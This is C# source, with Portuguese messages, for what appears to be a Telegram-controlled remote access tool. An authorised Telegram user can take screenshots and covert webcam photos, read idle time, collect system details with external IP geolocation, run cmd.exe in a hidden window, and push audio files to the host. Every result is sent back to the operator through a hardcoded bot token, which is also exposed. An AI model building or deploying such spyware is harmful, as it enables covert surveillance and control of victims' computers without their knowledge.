using Microsoft.Win32;
using Newtonsoft.Json;
using NGeoIP;
using NGeoIP.Client;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;
using System.Drawing;
using AForge.Video.DirectShow;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Telegram
{
    public partial class Mainform : Form
    {
        private static String botToken = "261017328:AAGxCqeNk058P7szLyXAMhjaiT8TVMNv6SU";
        private static readonly TelegramBotClient bot = new TelegramBotClient(botToken);
        private static readonly String urlDownload = "https://api.telegram.org/file/bot" + botToken + "/";
        private static String AuthorizedID = "287436391";
        private static readonly String MachineKey = Environment.MachineName + "_" + Environment.UserName;
        private PictureBox picbox = new PictureBox();
        private Bot.Types.Message lastMessage = null;

        private String fileName = String.Empty;
        private String imageName = String.Empty;
        private String tempFolder = String.Empty;
        private Boolean imgPicked = false;
        private Boolean isAcceptingFile = false;
        private Boolean executeAudio = false;
        private Boolean lockedExecution = false;

        private const String COMMAND_DELIMITER = "#";

        // Considerar a primeira câmera que for encontrada no sistema
        const int VIDEODEVICE = 0;

        #region Commands
        private const String LIST = "/list";
        private const String INFO = "info";
        private const String INFOFULL = "infofull";
        private const String CAMERA = "camera";
        private const String SHOWMESSAGE = "showmessage";
        private const String SCREENSHOT = "screenshot";
        private const String TAKESHOT = "takeshot";
        private const String ACCEPTFILE = "acceptfile";
        private const String ACCEPT_EXECUTEFILE = "acceptexecutefile";
        private const String CHECK_AFK = "checkafk";
        private const String CMD = "cmd";
        private const String OPEN_URL = "openurl";
        private const String UPLOAD_FILE = "uploadfile";
        private const String SEND_FILE_BY_EMAIL = "sendfilebyemail";
        private const String PROCESS = "process";
        private const String SEND_MIC_STREAM = "sendmicstream";
        private const String SEND_CAM_STREAM = "sendcamstream";
        private const String KILL_BOT = "killbot";
        private const String PERSIST_BOT = "persistbot";
        
        #endregion

        public Mainform()
        {
            InitializeComponent();
        }

        private void ConfigureNameAndFolder()
        {
            imageName = Guid.NewGuid().ToString().Replace("-", "");
            tempFolder = Environment.GetEnvironmentVariable("TEMP") + "\\";

        }

        private void ConfigureFileNameToImage()
        {
            fileName = String.Concat(tempFolder, imageName, ".jpg");
        }

        private void ConfigureFileNameToAudio()
        {
            fileName = String.Concat(tempFolder, imageName, ".mp3");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Enviar mensagem no chat
            String chatId = comboBox1.Items[comboBox1.SelectedIndex].ToString().Split('|')[0];
            var msg = bot.SendTextMessageAsync(Convert.ToInt32(chatId), textBox1.Text).Result;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                var updates = bot.GetUpdatesAsync().Result;

                foreach (var update in updates)
                {
                    String id = update.Message.Chat.Id.ToString() + "|" + update.Message.Chat.Title;
                    comboBox1.Items.Add(id);
                }

                bot.OnMessage += BotOnMessageReceived;
                bot.OnMessageEdited += BotOnMessageReceived;
                bot.OnInlineQuery += BotOnInlineQueryReceived;
                bot.OnCallbackQuery += BotOnCallbackQueryReceived;
                bot.StartReceiving();
            }
            catch (Exception)
            {

            }
        }

        private void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs e)
        {

        }

        private void BotOnInlineQueryReceived(object sender, InlineQueryEventArgs e)
        {
            //String teste = "";
        }

        public static string getExternalIp()
        {
            try
            {
                string externalIP;

                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                             .Matches(externalIP)[0].ToString();

                return externalIP;
            }
            catch
            {
                return String.Empty;
            }
        }

        private String getIPAdress()
        {
            try
            {
                if (isOnline())
                {
                    return getExternalIp();
                }

                string hostName = Dns.GetHostName();
                string myIP = Dns.GetHostEntry(hostName).AddressList[0].ToString();
                return myIP;
            }
            catch (Exception)
            {
                return String.Empty;
            }
        }

        private String getProcessorName()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

                if (key != null)
                {
                    if (key.GetValue("ProcessorNameString") != null)
                    {
                        return key.GetValue("ProcessorNameString").ToString();
                    }
                    else
                    {
                        return Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
                    }
                }
            }
            catch (Exception)
            {
                return String.Empty;
            }

            return String.Empty;
        }

        private Boolean isOnline()
        {
            try
            {
                Ping myPing = new Ping();
                String host = "8.8.8.8";
                byte[] buffer = new byte[32];
                int timeout = 1000;
                PingOptions pingOptions = new PingOptions();
                PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);

                return reply.Status == IPStatus.Success;

            }
            catch (Exception)
            {
                return false;
            }
        }

        private Boolean GetIsAudioFile(Bot.Types.Message message)
        {
            return message.Type == MessageType.AudioMessage || message.Type == MessageType.VoiceMessage;
        }

        private void BotOnMessageReceived(object sender, MessageEventArgs e)
        {
            try
            {
                var message = e.Message;
                Boolean respondeu = false;
                var commandIndex = -1;
                String command = String.Empty;

                if (message == null)
                {
                    return;
                }
                else
                {
                    lastMessage = message;
                }

                if (message.From.Id.ToString() != AuthorizedID)
                {
                    return;
                }

                if (lockedExecution)
                {
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), MachineKey + " ainda está executando uma requisição anterior.").Result;
                    respondeu = true;
                    return;
                }

                lockedExecution = true;

                if (message.Text.StartsWith(LIST))
                {
                    bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), MachineKey).Result;
                    lockedExecution = false;
                    return;
                }

                if (!GetIsAudioFile(message))
                {
                    commandIndex = message.Text.IndexOf(COMMAND_DELIMITER);

                    if (commandIndex == -1)
                    {
                        var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), message.Text).Result;
                        lockedExecution = false;
                        respondeu = true;
                        return;
                    }

                    command = message.Text.Split('#')[1];
                }

                if (command.StartsWith(ACCEPTFILE))
                {
                    isAcceptingFile = true;
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), MachineKey + " vai aceitar o próximo arquivo enviado.").Result;
                    respondeu = true;
                    lockedExecution = false;
                    return;
                }

                if (command.StartsWith(ACCEPT_EXECUTEFILE))
                {
                    isAcceptingFile = true;
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), MachineKey + " vai aceitar e executar o próximo arquivo enviado.").Result;
                    respondeu = true;
                    lockedExecution = false;
                    return;
                }

                if (GetIsAudioFile(message))
                {
                    if (isAcceptingFile)
                    {
                        isAcceptingFile = false;
                        ProcessAudioMessage(message, out respondeu);
                    }
                    else
                    {
                        var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), MachineKey + String.Format(" não está aceitando arquivos, use o comando /HOSTNAME #{0} ou #{1}", ACCEPTFILE, ACCEPT_EXECUTEFILE)).Result;
                        respondeu = true;
                        lockedExecution = false;
                        return;
                    }
                }

                if (!respondeu)
                {
                    bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);

                    if (message.Text.StartsWith("/" + MachineKey))
                    {

                        //Notifica ao usuário que o bot está digitando...
                        bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);

                        if (command.StartsWith(INFO))
                        {
                            ProcessaInfo(message, out respondeu, command);
                        }

                        if (!respondeu)
                        {
                            if (command.StartsWith(SCREENSHOT))
                            {
                                ProcessaScreenShot(message, out respondeu);
                            }
                        }

                        if (!respondeu)
                        {
                            if (command.StartsWith(SHOWMESSAGE))
                            {
                                ProcessaShowMessage(message, out respondeu, command);
                            }
                        }

                        if (!respondeu)
                        {
                            if (command.StartsWith(TAKESHOT))
                            {
                                ProcessaTakeShot(message, out respondeu);
                            }
                        }

                        if (!respondeu)
                        {
                            if (command.StartsWith(CHECK_AFK))
                            {
                                ProcessAFKChecking(message, out respondeu);
                            }
                        }

                        if (!respondeu)
                        {
                            if (command.StartsWith(CMD))
                            {
                                ProcessCMD(message, out respondeu);
                            }
                        }

                        if (!respondeu)
                        {
                        if (command.StartsWith(OPEN_URL))
                        {
                            ProcessOpenURL(message, out respondeu);
                        }
                        }

                        if (!respondeu)
                        {
                            //Se ainda não respondeu faz um eco
                            if (!String.IsNullOrEmpty(message.Text))
                            {
                                var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), message.Text).Result;
                                lockedExecution = false;
                            }
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                GravarArquivo(ex);
            }
        }

        private void ProcessOpenURL(Bot.Types.Message message, out bool respondeu)
        {
            lockedExecution = true;

            try
            {
                Process.Start("http://google.com.br");
                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "URL aberta com sucesso no host " + MachineKey).Result;
                lockedExecution = false;
                respondeu = true;
            }
            catch (Exception)
            {
                lockedExecution = false;
                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "Erro ao abrir URL no host " + MachineKey).Result;
                respondeu = true;
            }
        }

        private void ProcessCMD(Bot.Types.Message message, out bool respondeu)
        {
            lockedExecution = true;
            try
            {
                //Create process
                Process pProcess = new Process();

                pProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                pProcess.StartInfo.FileName = "cmd.exe";
                //strCommandParameters are parameters to pass to program
                pProcess.StartInfo.Arguments = "/c dir";

                pProcess.StartInfo.UseShellExecute = false;

                //Set output of program to be written to process output stream
                pProcess.StartInfo.RedirectStandardOutput = true;

                //Optional
                pProcess.StartInfo.WorkingDirectory = "C:\\temp";

                //Start the process
                pProcess.Start();

                //Get program output
                string strOutput = pProcess.StandardOutput.ReadToEnd();

                //Wait for process to finish
                pProcess.WaitForExit();


                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), strOutput).Result;
                respondeu = true;
                lockedExecution = false;

            }
            catch (Exception)
            {
                respondeu = true;
                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "Ocorreu um erro ao tentar usar o comando CMD em " + MachineKey).Result;

            }
        }

        private void ProcessAFKChecking(Bot.Types.Message message, out bool respondeu)
        {

            try
            {
                lockedExecution = true;
                bot.SendChatActionAsync(message.Chat.Id, ChatAction.UploadAudio);

                var lastInputInfo = new LASTINPUTINFO();
                lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);

                GetLastInputInfo(ref lastInputInfo);

                var lastInput = DateTime.Now.AddMilliseconds(
                    -(Environment.TickCount - lastInputInfo.dwTime));

                var diferenca = DateTime.Now - lastInput;

                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), String.Format("O usuário {0} de {1} está sem interagir com o computador a {2}", Environment.UserName, MachineKey, diferenca.ToString(@"hh\Hmm\Mss\S"))).Result;
                respondeu = true;
                lockedExecution = false;
            }
            catch (Exception ex)
            {
                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "Ocorreu um erro ao tentar obter o AFK de " + MachineKey).Result;
                respondeu = true;
                lockedExecution = false;
            }
        }

        private void ProcessAudioMessage(Bot.Types.Message message, out bool respondeu)
        {
            respondeu = false;

            try
            {
                bot.SendChatActionAsync(message.Chat.Id, ChatAction.UploadAudio);

                String fileId = message.Type == MessageType.AudioMessage ? message.Audio.FileId : message.Voice.FileId;
                executeAudio = true;

                var file = bot.GetFileAsync(fileId).Result;
                ConfigureNameAndFolder();
                ConfigureFileNameToAudio();

                if (file != null)
                {
                    using (var wc = new WebClient())

                    {
                        Uri url = new Uri(urlDownload + file.FilePath);
                        var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "Download do audio iniciado em " + MachineKey).Result;
                        wc.DownloadFileCompleted += DownloadAudioFileComplete;
                        wc.DownloadFileAsync(url, fileName);
                        respondeu = true;
                    }
                }
            }
            catch (Exception)
            {
                var msg = "Erro ao ";
                msg += executeAudio ? "executar o audio " : "salvar o áudio ";
                msg += "no host " + MachineKey;

                var ret = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "Ocorreu um erro ao receber o aúdio no host " + MachineKey).Result;
                respondeu = true;
                lockedExecution = false;
                return;
            }
        }

        private void DownloadAudioFileComplete(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            lockedExecution = false;

            if (executeAudio)
            {
                executeAudio = false;
                playSound(fileName);
            }
        }

        private void ProcessaDirectory(Bot.Types.Message message, out bool respondeu)
        {
            respondeu = false;
        }

        private void ProcessaTakeShot(Bot.Types.Message message, out bool respondeu)
        {
            FilterInfoCollection videosources = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if (VIDEODEVICE + 1 > videosources.Count)
            {
                var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), "O host " + MachineKey + " não possui webcam instalada.").Result;
                respondeu = true;
                lockedExecution = false;
                return;
            }


            if (videosources != null)
            {
                var videoSource = new VideoCaptureDevice(videosources[0].MonikerString);
                var videoCapabilities = videoSource.VideoCapabilities;
                var snapshotCapabilities = videoSource.SnapshotCapabilities;

                if ((videoCapabilities != null) && (videoCapabilities.Length != 0))
                {
                    videoSource.VideoResolution = videoCapabilities[0];
                }

                picbox.Size = new Size(640, 480);

                videoSource.NewFrame += VideoSource_NewFrame; ;
                videoSource.Start();

                ConfigureNameAndFolder();
                ConfigureFileNameToImage();

                if (System.IO.File.Exists(fileName))
                {
                    System.IO.File.Delete(fileName);
                }

                imgPicked = false;

                Stopwatch s = new Stopwatch();
                s.Start();

                while (s.Elapsed < TimeSpan.FromSeconds(10))
                {
                    if (imgPicked)
                    {
                        if (videoSource != null && videoSource.IsRunning)
                        {
                            videoSource.SignalToStop();
                            videoSource = null;
                        }
                        s.Stop();
                        break;

                    }
                }

                if (imgPicked)
                {
                    using (var ms = System.IO.File.Open(fileName, FileMode.Open))
                    {
                        bot.SendChatActionAsync(message.Chat.Id, ChatAction.UploadPhoto);

                        FileToSend file = new FileToSend(fileName, ms);
                        var msg = bot.SendPhotoAsync(message.Chat.Id, file, "Foto da webcam de " + MachineKey).Result;
                        respondeu = true;
                        lockedExecution = false;
                        return;
                    }
                }

                respondeu = true;
                return;
            }
            respondeu = false;
        }

        private void VideoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            var img = (Bitmap)eventArgs.Frame.Clone();
            picbox.Image = img;
            if (picbox.Image != null)
            {
                picbox.Image.Save(fileName, System.Drawing.Imaging.ImageFormat.Jpeg);
                imgPicked = true;
            }
        }

        private void ProcessaShowMessage(Bot.Types.Message message, out bool respondeu, String command)
        {
            bot.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);

            try
            {
                String comp = command.Substring(SHOWMESSAGE.Length, (command.Length - SHOWMESSAGE.Length));

                MessageBox.Show(comp, "Mensagem do sistema");
                respondeu = true;
                lockedExecution = false;
            }
            catch (Exception)
            {
                respondeu = false;
            }
        }

        private void ProcessaScreenShot(Bot.Types.Message message, out bool respondeu)
        {
            bot.SendChatActionAsync(message.Chat.Id, ChatAction.UploadPhoto);

            try
            {
                using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                    {
                        g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                         Screen.PrimaryScreen.Bounds.Y,
                                         0, 0,
                                         bmpScreenCapture.Size,
                                         CopyPixelOperation.SourceCopy);


                        ConfigureNameAndFolder();
                        ConfigureFileNameToImage();

                        if (System.IO.File.Exists(fileName))
                        {
                            System.IO.File.Delete(fileName);
                        }

                        bmpScreenCapture.Save(fileName, System.Drawing.Imaging.ImageFormat.Jpeg);

                        using (var ms = System.IO.File.Open(fileName, FileMode.Open))
                        {
                            FileToSend file = new FileToSend(fileName, ms);
                            var msg = bot.SendPhotoAsync(message.Chat.Id, file, "ScreenShot de " + MachineKey).Result;
                            respondeu = true;
                            lockedExecution = false;
                            return;
                        }
                    }
                }


            }
            catch (Exception)
            {
                respondeu = false;
                lockedExecution = false;
            }
        }

        private void GravarArquivo(Exception ex)
        {
            using (StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "\\" + "erros.txt", true))
            {
                file.WriteLine("-----------------------------------------------------------");
                file.Write("Exceção: " + ex.Message + " \n");
                file.Write("Exceção interna: " + (ex.InnerException != null && !String.IsNullOrEmpty(ex.InnerException.Message) ? ex.InnerException.Message : String.Empty + " \n"));
                file.Write("Data/Hora: " + String.Format("{0:dd/MM/yyyy HH:mm:ss}", DateTime.Now) + " \n");
            }
        }

        private void playSound(string path)
        {
            try
            {
                Process.Start("wmplayer.exe", path);

                if (lastMessage != null)
                {
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(lastMessage.Chat.Id), "O host " + MachineKey + " executou o audio enviado com sucesso.").Result;
                }
            }
            catch (Exception)
            {
                if (lastMessage != null)
                {
                    var msg = bot.SendTextMessageAsync(Convert.ToInt32(lastMessage.Chat.Id), "O host " + MachineKey + " não conseguiu executar o audio enviado.").Result;
                }
            }
        }

        private void ProcessaInfo(Bot.Types.Message message, out bool respondeu, String command)
        {
            var info = new StringBuilder();
            var ipAdress = String.Empty;

            if (command.StartsWith(INFOFULL))
            {
                ipAdress = getIPAdress();
            }

            var computerInfo = new Microsoft.VisualBasic.Devices.ComputerInfo();

            info.Append("Nome da máquina: ");
            info.AppendLine(Environment.MachineName);
            info.Append("Processador: ");
            info.AppendLine(getProcessorName());
            info.Append("Memória RAM total: ");
            info.AppendLine(computerInfo.TotalPhysicalMemory / 1024000 + " MB");
            info.Append("Memória RAM disponível: ");
            info.AppendLine(computerInfo.AvailablePhysicalMemory / 1024000 + " MB");
            info.AppendLine("Discos: ");
            foreach (var item in getDriveInfo())
            {
                info.Append("Nome: ");
                info.AppendLine(item.Name);

                if (item.DriveFormat != null)
                {
                    info.Append("Formato: ");
                    info.AppendLine(item.DriveFormat);
                }

                if (item.DriveType != null)
                {
                    info.Append("Tipo: ");
                    info.AppendLine(item.DriveType);
                }

                info.AppendLine("Tamanho total: ");
                info.AppendLine(item.TotalSpace);
                info.AppendLine("Espaço livre: ");
                info.AppendLine(item.FreeSpace);
            }

            info.Append("Usuário logado: ");
            info.AppendLine(Environment.UserName);
            info.AppendLine("Versão do Windows: ");
            info.Append(computerInfo.OSFullName + " ");
            info.AppendLine(Environment.Is64BitOperatingSystem ? " | 64 bits" : String.Empty);
            info.Append("Processadores: ");
            info.AppendLine(Environment.ProcessorCount.ToString());
            info.AppendLine("Diretório do sistema: ");
            info.AppendLine(Environment.SystemDirectory);

            if (!String.IsNullOrEmpty(ipAdress))
            {
                info.AppendLine("Endereço IP: " + ipAdress);
            }

            try
            {
                if (!String.IsNullOrEmpty(ipAdress))
                {
                    var nGeoRequest = new Request()
                    {
                        Format = Format.Json,
                        IP = ipAdress
                    };

                    var nGeoClient = new NGeoClient(nGeoRequest);

                    var rawData = nGeoClient.Execute();

                    info.Append("País: ");
                    info.AppendLine(rawData.CountryCode + "|" + rawData.CountryName);
                    info.Append("Cidade: ");
                    info.AppendLine(rawData.City);
                }
            }
            catch (Exception)
            {
                info.AppendLine("Não foi possível obter a geolocalização do IP");
                lockedExecution = false;
            }

            var msg = bot.SendTextMessageAsync(Convert.ToInt32(message.Chat.Id), info.ToString()).Result;
            respondeu = true;
            lockedExecution = false;
            return;
        }

        private List<HardDriveInfo> getDriveInfo()
        {
            var drives = new List<HardDriveInfo>();

            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.IsReady && (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable))
                    {
                        var localDrive = new HardDriveInfo();
                        localDrive.Name = drive.Name;
                        localDrive.DriveFormat = drive.DriveFormat;
                        localDrive.DriveType = drive.DriveType.ToString();
                        localDrive.FreeSpace = drive.AvailableFreeSpace / 1024000 + " MB";
                        localDrive.TotalSpace = drive.TotalSize / 1024000 + " MB";

                        drives.Add(localDrive);
                    }
                }
            }
            catch (Exception)
            {
                return drives;
            }

            return drives;
        }

        private void Form1_Leave(object sender, EventArgs e)
        {
            bot.StopReceiving();
        }

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        internal struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }
    }

    public class HardDriveInfo
    {
        public String Name { get; set; }
        public String FreeSpace { get; set; }
        public String TotalSpace { get; set; }
        public String PercentFree { get; set; }
        public String SpaceUsed { get; set; }
        public String DriveFormat { get; set; }
        public String DriveType { get; set; }

    }

    [Serializable]
    public class Dados
    {
        public String Nome;
        public String DtNascimento;
        public String Endereco;
        public String Numero;
        public String Complemento;
        public String Bairro;
        public String CEP;
        public String Municipio;
        public String UF;
        public String NomeMae;
        public String Status;


        public void Clear()
        {
            Nome = String.Empty;
            DtNascimento = String.Empty;
            Endereco = String.Empty;
            Numero = String.Empty;
            Complemento = String.Empty;
            Bairro = String.Empty;
            CEP = String.Empty;
            Municipio = String.Empty;
            UF = String.Empty;
            NomeMae = String.Empty;
            Status = String.Empty;
        }
    }
}
